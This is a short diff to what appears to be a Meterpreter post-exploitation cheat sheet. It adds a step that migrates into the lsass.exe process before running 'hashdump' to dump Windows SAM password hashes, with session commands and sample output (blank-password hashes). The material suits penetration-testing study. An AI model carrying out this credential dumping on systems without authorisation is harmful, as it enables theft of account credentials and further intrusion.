@@ -506,7 +506,12 @@ meterpreter > migrate 716
 [*] Migration completed successfully.
 ```  
 `hashdump`: list the content of the SAM database  
+Sometimes, it is to need migrate to `lsass.exe` PID.  
 ```
+meterpreter > ps
+meterpreter > migrate 776
+[*] Migrating from 3684 to 776...
+[*] Migration completed successfully.
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
